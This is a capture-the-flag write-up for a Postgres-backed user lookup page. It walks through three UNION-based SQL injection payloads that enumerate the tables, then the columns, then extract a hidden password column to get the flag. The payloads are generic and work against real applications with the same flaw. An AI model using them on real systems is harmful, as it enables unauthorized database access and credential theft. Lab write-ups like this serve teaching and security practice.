# Web: SQLi
Difficulty: Medium/Advanced

In this challenge, you're given a simple user lookup system, where you can input an email and get back a list of usernames. 
You are told that the database is using Postgres and that the website admin made creative table and column names. 

This endpoint is vulnerable to SQL injection. You can get the table names using the following injection (note there must be a space following the --):
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'; -- 

The table name is secret_users_table_sfd33.

You can get the column names using the following query:
' UNION SELECT column_name from information_schema.columns WHERE table_name = 'secret_users_table_sfd33'; -- 

The columns are: ['computername', 'id', 'email', 'passfrase']

We are probably interested in the "passfrase". 
' UNION SELECT passfrase FROM secret_users_table_sfd33; -- 

This gets us the flag. 